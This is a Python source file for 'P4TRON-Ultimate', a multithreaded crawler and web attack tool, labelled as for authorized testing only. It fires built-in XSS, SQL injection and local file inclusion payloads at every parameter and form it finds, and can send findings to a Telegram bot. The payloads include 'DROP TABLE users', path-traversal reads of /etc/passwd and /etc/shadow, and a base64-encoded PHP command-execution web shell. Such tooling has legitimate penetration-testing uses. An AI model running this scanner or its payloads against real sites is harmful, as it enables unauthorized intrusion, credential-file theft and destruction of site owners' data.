#!/usr/bin/env python3
"""
P4TRON-Ultimate - Advanced Web Vulnerability Scanner
For authorized penetration testing and educational purposes only.
"""

import argparse
import concurrent.futures
import logging
import queue
import random
import re
import sys
import time
import urllib.parse
from datetime import datetime
from threading import Lock

import requests
from bs4 import BeautifulSoup
from colorama import Fore, Style, init

init(autoreset=True)

# ─────────────────────────────────────────────
#  BANNER
# ─────────────────────────────────────────────
BANNER = f"""
{Fore.RED}██████╗ ██╗  ██╗████████╗██████╗  ██████╗ ███╗   ██╗
{Fore.RED}██╔══██╗██║  ██║╚══██╔══╝██╔══██╗██╔═══██╗████╗  ██║
{Fore.RED}██████╔╝███████║   ██║   ██████╔╝██║   ██║██╔██╗ ██║
{Fore.RED}██╔═══╝ ╚════██║   ██║   ██╔══██╗██║   ██║██║╚██╗██║
{Fore.RED}██║          ██║   ██║   ██║  ██║╚██████╔╝██║ ╚████║
{Fore.RED}╚═╝          ╚═╝   ╚═╝   ╚═╝  ╚═╝ ╚═════╝ ╚═╝  ╚═══╝
{Fore.WHITE}          ██╗   ██╗██╗  ████████╗██╗███╗   ███╗ █████╗ ████████╗███████╗
{Fore.WHITE}          ██║   ██║██║  ╚══██╔══╝██║████╗ ████║██╔══██╗╚══██╔══╝██╔════╝
{Fore.WHITE}          ██║   ██║██║     ██║   ██║██╔████╔██║███████║   ██║   █████╗
{Fore.WHITE}          ██║   ██║██║     ██║   ██║██║╚██╔╝██║██╔══██║   ██║   ██╔══╝
{Fore.WHITE}          ╚██████╔╝███████╗██║   ██║██║ ╚═╝ ██║██║  ██║   ██║   ███████╗
{Fore.WHITE}           ╚═════╝ ╚══════╝╚═╝   ╚═╝╚═╝     ╚═╝╚═╝  ╚═╝   ╚═╝   ╚══════╝
{Fore.RED}  ╔══════════════════════════════════════════════════════════════════════╗
{Fore.RED}  ║  {Fore.WHITE}>> Advanced Web Vulnerability Scanner v2.0 <<{Fore.RED}                       ║
{Fore.RED}  ║  {Fore.WHITE}>> XSS | SQLi | LFI | Crawler | Telegram Alerts{Fore.RED}                   ║
{Fore.RED}  ║  {Fore.WHITE}>> For authorized testing & educational use ONLY{Fore.RED}                   ║
{Fore.RED}  ╚══════════════════════════════════════════════════════════════════════╝
{Style.RESET_ALL}"""

# ─────────────────────────────────────────────
#  CONSTANTS
# ─────────────────────────────────────────────
USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_0) AppleWebKit/605.1.15 Safari/605.1.15",
    "Mozilla/5.0 (X11; Linux x86_64; rv:121.0) Gecko/20100101 Firefox/121.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Edg/120.0.0.0",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Android 14; Mobile; rv:121.0) Gecko/121.0 Firefox/121.0",
    "curl/8.4.0",
    "python-requests/2.31.0",
]

XSS_PAYLOADS = [
    "<script>alert(1)</script>",
    "<img src=x onerror=alert(1)>",
    "'\"><script>alert(1)</script>",
    "<svg onload=alert(1)>",
    "javascript:alert(1)",
    "<body onload=alert(1)>",
    "';alert(String.fromCharCode(88,83,83))//",
    "<scr<script>ipt>alert(1)</scr</script>ipt>",
    "<iframe src=\"javascript:alert(1)\">",
    "<<SCRIPT>alert(1)//<</SCRIPT>",
    "\"><img src=1 onerror=alert(1)>",
    "';confirm`1`//",
]

SQLI_PAYLOADS = [
    "'",
    "\"",
    "' OR '1'='1",
    "' OR '1'='1' --",
    "' OR 1=1--",
    "\" OR \"1\"=\"1",
    "1' ORDER BY 1--",
    "1' ORDER BY 2--",
    "1' ORDER BY 3--",
    "' UNION SELECT NULL--",
    "' UNION SELECT NULL,NULL--",
    "1; DROP TABLE users--",
    "' AND SLEEP(2)--",
    "1 AND 1=1",
    "1 AND 1=2",
    "' AND 1=CONVERT(int,(SELECT TOP 1 table_name FROM information_schema.tables))--",
]

SQLI_ERRORS = [
    "sql syntax", "mysql_fetch", "ora-", "sqlstate", "syntax error",
    "unclosed quotation", "quoted string not properly terminated",
    "microsoft jet database", "odbc microsoft access", "supplied argument is not a valid mysql",
    "you have an error in your sql syntax", "warning: mysql", "postgresql query failed",
    "pg_query()", "pg_exec()", "valid postgresql result", "npgsql.",
    "sqlite_array_query", "sqlite_", "system.data.sqlite", "driver.*sql",
    "[microsoft][odbc sql server driver]",
]

LFI_PAYLOADS = [
    "../../etc/passwd",
    "../../../etc/passwd",
    "../../../../etc/passwd",
    "../../../../../etc/passwd",
    "../../../../../../etc/passwd",
    "../../etc/shadow",
    "../../windows/system32/drivers/etc/hosts",
    "../../boot.ini",
    "....//....//etc/passwd",
    "..%2F..%2Fetc%2Fpasswd",
    "%2e%2e%2f%2e%2e%2fetc%2fpasswd",
    "php://filter/convert.base64-encode/resource=index.php",
    "php://input",
    "data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7Pz4=",
]

LFI_SIGNATURES = [
    "root:x:", "root:!", "/bin/bash", "/bin/sh",
    "[boot loader]", "[operating systems]",
    "for 1-bit com and exe files",
    "base64",
]

TIMEOUT = 10
MAX_CRAWL_DEPTH = 3
MAX_URLS = 500


# ─────────────────────────────────────────────
#  LOGGER SETUP
# ─────────────────────────────────────────────
def setup_logger(log_file: str) -> logging.Logger:
    logger = logging.getLogger("P4TRON")
    logger.setLevel(logging.DEBUG)

    file_handler = logging.FileHandler(log_file, encoding="utf-8")
    file_handler.setLevel(logging.DEBUG)
    file_fmt = logging.Formatter("[%(asctime)s] [%(levelname)s] %(message)s", datefmt="%Y-%m-%d %H:%M:%S")
    file_handler.setFormatter(file_fmt)
    logger.addHandler(file_handler)

    return logger


# ─────────────────────────────────────────────
#  UTILITIES
# ─────────────────────────────────────────────
def random_headers() -> dict:
    return {
        "User-Agent": random.choice(USER_AGENTS),
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
        "Accept-Language": "en-US,en;q=0.5",
        "Accept-Encoding": "gzip, deflate",
        "Connection": "keep-alive",
    }


def normalize_url(base: str, href: str) -> str | None:
    try:
        joined = urllib.parse.urljoin(base, href)
        parsed = urllib.parse.urlparse(joined)
        clean = parsed._replace(fragment="").geturl()
        return clean if parsed.scheme in ("http", "https") else None
    except Exception:
        return None


def same_domain(base_url: str, target_url: str) -> bool:
    try:
        base_host = urllib.parse.urlparse(base_url).netloc
        target_host = urllib.parse.urlparse(target_url).netloc
        return base_host == target_host
    except Exception:
        return False


def extract_forms(html: str, base_url: str) -> list[dict]:
    soup = BeautifulSoup(html, "html.parser")
    forms = []
    for form in soup.find_all("form"):
        action = form.get("action", "")
        method = form.get("method", "get").lower()
        action_url = normalize_url(base_url, action) or base_url
        inputs = []
        for inp in form.find_all(["input", "textarea", "select"]):
            input_name = inp.get("name")
            input_type = inp.get("type", "text")
            input_value = inp.get("value", "")
            if input_name:
                inputs.append({"name": input_name, "type": input_type, "value": input_value})
        forms.append({"action": action_url, "method": method, "inputs": inputs})
    return forms


def get_url_params(url: str) -> dict:
    parsed = urllib.parse.urlparse(url)
    params = urllib.parse.parse_qs(parsed.query, keep_blank_values=True)
    return {k: v[0] for k, v in params.items()}


def inject_param(url: str, param: str, payload: str) -> str:
    parsed = urllib.parse.urlparse(url)
    params = urllib.parse.parse_qs(parsed.query, keep_blank_values=True)
    params[param] = [payload]
    new_query = urllib.parse.urlencode(params, doseq=True)
    return parsed._replace(query=new_query).geturl()


def print_finding(vuln_type: str, url: str, param: str, payload: str) -> None:
    ts = datetime.now().strftime("%H:%M:%S")
    print(
        f"{Fore.RED}[{ts}] [{Fore.WHITE}VULN{Fore.RED}] "
        f"{Fore.WHITE}{vuln_type} {Fore.RED}| "
        f"{Fore.WHITE}URL: {Fore.RED}{url} "
        f"{Fore.WHITE}| Param: {Fore.RED}{param} "
        f"{Fore.WHITE}| Payload: {Fore.RED}{payload}{Style.RESET_ALL}"
    )


def print_info(msg: str) -> None:
    ts = datetime.now().strftime("%H:%M:%S")
    print(f"{Fore.RED}[{ts}] [{Fore.WHITE}INFO{Fore.RED}] {Fore.WHITE}{msg}{Style.RESET_ALL}")


def print_error(msg: str) -> None:
    ts = datetime.now().strftime("%H:%M:%S")
    print(f"{Fore.RED}[{ts}] [{Fore.RED}ERR {Fore.RED}] {Fore.WHITE}{msg}{Style.RESET_ALL}")


# ─────────────────────────────────────────────
#  TELEGRAM ALERTER
# ─────────────────────────────────────────────
class TelegramAlerter:
    def __init__(self, token: str, chat_id: str):
        self.token = token
        self.chat_id = chat_id
        self.api_url = f"https://api.telegram.org/bot{token}/sendMessage"
        self._lock = Lock()

    def send(self, message: str) -> bool:
        with self._lock:
            try:
                payload = {
                    "chat_id": self.chat_id,
                    "text": message,
                    "parse_mode": "Markdown",
                }
                resp = requests.post(self.api_url, data=payload, timeout=10)
                return resp.status_code == 200
            except Exception:
                return False

    def alert_finding(self, vuln_type: str, url: str, param: str, payload_used: str) -> None:
        msg = (
            f"🚨 *P4TRON-Ultimate Finding*\n"
            f"*Type:* `{vuln_type}`\n"
            f"*URL:* `{url}`\n"
            f"*Parameter:* `{param}`\n"
            f"*Payload:* `{payload_used}`\n"
            f"*Time:* `{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}`"
        )
        self.send(msg)


# ─────────────────────────────────────────────
#  CRAWLER
# ─────────────────────────────────────────────
class Crawler:
    def __init__(self, base_url: str, max_depth: int = MAX_CRAWL_DEPTH, max_urls: int = MAX_URLS):
        self.base_url = base_url
        self.max_depth = max_depth
        self.max_urls = max_urls
        self.visited: set[str] = set()
        self.url_queue: queue.Queue = queue.Queue()
        self._lock = Lock()

    def fetch(self, url: str) -> str | None:
        try:
            resp = requests.get(url, headers=random_headers(), timeout=TIMEOUT, allow_redirects=True, verify=False)
            if "text/html" in resp.headers.get("Content-Type", ""):
                return resp.text
        except Exception:
            pass
        return None

    def crawl(self) -> list[str]:
        self.url_queue.put((self.base_url, 0))
        self.visited.add(self.base_url)

        while not self.url_queue.empty() and len(self.visited) < self.max_urls:
            try:
                url, depth = self.url_queue.get_nowait()
            except queue.Empty:
                break

            if depth > self.max_depth:
                continue

            print_info(f"Crawling [{depth}/{self.max_depth}]: {url}")
            html = self.fetch(url)
            if not html:
                continue

            soup = BeautifulSoup(html, "html.parser")
            for tag in soup.find_all(["a", "form", "script", "link"]):
                href = tag.get("href") or tag.get("action") or tag.get("src")
                if not href:
                    continue
                normalized = normalize_url(url, href)
                if not normalized:
                    continue
                with self._lock:
                    if normalized not in self.visited and same_domain(self.base_url, normalized):
                        if len(self.visited) < self.max_urls:
                            self.visited.add(normalized)
                            self.url_queue.put((normalized, depth + 1))

        return list(self.visited)


# ─────────────────────────────────────────────
#  SCANNER
# ─────────────────────────────────────────────
class VulnerabilityScanner:
    def __init__(self, logger: logging.Logger, alerter: TelegramAlerter | None = None):
        self.logger = logger
        self.alerter = alerter
        self._lock = Lock()
        self.findings: list[dict] = []

    def _record(self, vuln_type: str, url: str, param: str, payload: str) -> None:
        finding = {
            "type": vuln_type,
            "url": url,
            "param": param,
            "payload": payload,
            "timestamp": datetime.now().isoformat(),
        }
        with self._lock:
            self.findings.append(finding)
        print_finding(vuln_type, url, param, payload)
        self.logger.warning(f"[{vuln_type}] URL={url} PARAM={param} PAYLOAD={payload}")
        if self.alerter:
            self.alerter.alert_finding(vuln_type, url, param, payload)

    def _test_get_params(self, url: str, payloads: list[str], vuln_type: str, detection_fn) -> None:
        params = get_url_params(url)
        if not params:
            return
        for param in params:
            for payload in payloads:
                injected_url = inject_param(url, param, payload)
                try:
                    resp = requests.get(
                        injected_url, headers=random_headers(),
                        timeout=TIMEOUT, allow_redirects=True, verify=False
                    )
                    if detection_fn(resp, payload):
                        self._record(vuln_type, injected_url, param, payload)
                        return
                except Exception:
                    pass

    def _test_form(self, form: dict, payloads: list[str], vuln_type: str, detection_fn) -> None:
        for inp in form["inputs"]:
            if inp["type"] in ("submit", "button", "image", "reset", "hidden"):
                continue
            for payload in payloads:
                data = {i["name"]: i["value"] for i in form["inputs"]}
                data[inp["name"]] = payload
                try:
                    if form["method"] == "post":
                        resp = requests.post(
                            form["action"], data=data, headers=random_headers(),
                            timeout=TIMEOUT, allow_redirects=True, verify=False
                        )
                    else:
                        resp = requests.get(
                            form["action"], params=data, headers=random_headers(),
                            timeout=TIMEOUT, allow_redirects=True, verify=False
                        )
                    if detection_fn(resp, payload):
                        self._record(vuln_type, form["action"], inp["name"], payload)
                        return
                except Exception:
                    pass

    @staticmethod
    def _xss_detect(resp: requests.Response, payload: str) -> bool:
        return payload in resp.text

    def scan_xss(self, url: str, html: str) -> None:
        self._test_get_params(url, XSS_PAYLOADS, "Reflected XSS", self._xss_detect)
        forms = extract_forms(html, url)
        for form in forms:
            self._test_form(form, XSS_PAYLOADS, "Reflected XSS", self._xss_detect)

    @staticmethod
    def _sqli_detect(resp: requests.Response, payload: str) -> bool:
        body_lower = resp.text.lower()
        return any(err in body_lower for err in SQLI_ERRORS)

    def scan_sqli(self, url: str, html: str) -> None:
        self._test_get_params(url, SQLI_PAYLOADS, "SQL Injection", self._sqli_detect)
        forms = extract_forms(html, url)
        for form in forms:
            self._test_form(form, SQLI_PAYLOADS, "SQL Injection", self._sqli_detect)

    @staticmethod
    def _lfi_detect(resp: requests.Response, payload: str) -> bool:
        body_lower = resp.text.lower()
        return any(sig.lower() in body_lower for sig in LFI_SIGNATURES)

    def scan_lfi(self, url: str, html: str) -> None:
        self._test_get_params(url, LFI_PAYLOADS, "LFI", self._lfi_detect)
        forms = extract_forms(html, url)
        for form in forms:
            self._test_form(form, LFI_PAYLOADS, "LFI", self._lfi_detect)

    def scan_url(self, url: str) -> None:
        try:
            resp = requests.get(url, headers=random_headers(), timeout=TIMEOUT, verify=False)
            html = resp.text
        except Exception as exc:
            print_error(f"Failed to fetch {url}: {exc}")
            return

        self.scan_xss(url, html)
        self.scan_sqli(url, html)
        self.scan_lfi(url, html)


# ─────────────────────────────────────────────
#  ORCHESTRATOR
# ─────────────────────────────────────────────
class P4TRON:
    def __init__(self, args: argparse.Namespace):
        self.args = args
        self.logger = setup_logger(args.output)
        self.alerter: TelegramAlerter | None = None
        if args.telegram_token and args.telegram_chat_id:
            self.alerter = TelegramAlerter(args.telegram_token, args.telegram_chat_id)
            print_info("Telegram alerting enabled.")
        self.scanner = VulnerabilityScanner(self.logger, self.alerter)

    def run(self) -> None:
        print(BANNER)
        print_info(f"Target   : {self.args.url}")
        print_info(f"Threads  : {self.args.threads}")
        print_info(f"Depth    : {self.args.depth}")
        print_info(f"Output   : {self.args.output}")
        print_info("Starting crawler...\n")

        import urllib3
        urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

        crawler = Crawler(self.args.url, max_depth=self.args.depth, max_urls=self.args.max_urls)
        urls = crawler.crawl()
        print_info(f"\nCrawl complete. {len(urls)} URLs discovered. Starting vulnerability scan...\n")
        self.logger.info(f"Crawl complete. {len(urls)} URLs discovered.")

        start_time = time.time()
        with concurrent.futures.ThreadPoolExecutor(max_workers=self.args.threads) as executor:
            futures = {executor.submit(self.scanner.scan_url, url): url for url in urls}
            for future in concurrent.futures.as_completed(futures):
                exc = future.exception()
                if exc:
                    print_error(f"Thread exception: {exc}")

        elapsed = time.time() - start_time
        self._print_summary(len(urls), elapsed)

    def _print_summary(self, total_urls: int, elapsed: float) -> None:
        findings = self.scanner.findings
        print(f"\n{Fore.RED}{'═' * 70}{Style.RESET_ALL}")
        print(f"{Fore.WHITE}  SCAN SUMMARY{Style.RESET_ALL}")
        print(f"{Fore.RED}{'═' * 70}{Style.RESET_ALL}")
        print(f"{Fore.WHITE}  URLs Scanned  : {Fore.RED}{total_urls}")
        print(f"{Fore.WHITE}  Total Findings: {Fore.RED}{len(findings)}")
        print(f"{Fore.WHITE}  XSS           : {Fore.RED}{sum(1 for f in findings if f['type'] == 'Reflected XSS')}")
        print(f"{Fore.WHITE}  SQL Injection : {Fore.RED}{sum(1 for f in findings if f['type'] == 'SQL Injection')}")
        print(f"{Fore.WHITE}  LFI           : {Fore.RED}{sum(1 for f in findings if f['type'] == 'LFI')}")
        print(f"{Fore.WHITE}  Duration      : {Fore.RED}{elapsed:.2f}s")
        print(f"{Fore.WHITE}  Results saved : {Fore.RED}{self.args.output}")
        print(f"{Fore.RED}{'═' * 70}{Style.RESET_ALL}\n")
        self.logger.info(
            f"Scan complete. URLs={total_urls} Findings={len(findings)} Duration={elapsed:.2f}s"
        )


# ─────────────────────────────────────────────
#  CLI
# ─────────────────────────────────────────────
def parse_args() -> argparse.Namespace:
    parser = argparse.ArgumentParser(
        prog="p4tron",
        description="P4TRON-Ultimate | Advanced Web Vulnerability Scanner",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="Example:\n  python p4tron.py -u https://example.com -t 10 --depth 3",
    )
    parser.add_argument("-u", "--url", required=True, help="Target URL (e.g. https://example.com)")
    parser.add_argument("-t", "--threads", type=int, default=10, help="Number of threads (default: 10)")
    parser.add_argument("--depth", type=int, default=3, help="Crawler depth (default: 3)")
    parser.add_argument("--max-urls", type=int, default=MAX_URLS, help=f"Max URLs to crawl (default: {MAX_URLS})")
    parser.add_argument("-o", "--output", default="scan_results.txt", help="Output log file (default: scan_results.txt)")
    parser.add_argument("--telegram-token", default=None, help="Telegram Bot API token")
    parser.add_argument("--telegram-chat-id", default=None, help="Telegram Chat ID")
    return parser.parse_args()


def main() -> None:
    args = parse_args()
    try:
        engine = P4TRON(args)
        engine.run()
    except KeyboardInterrupt:
        print(f"\n{Fore.RED}[!] Scan interrupted by user.{Style.RESET_ALL}")
        sys.exit(0)


if __name__ == "__main__":
    main()
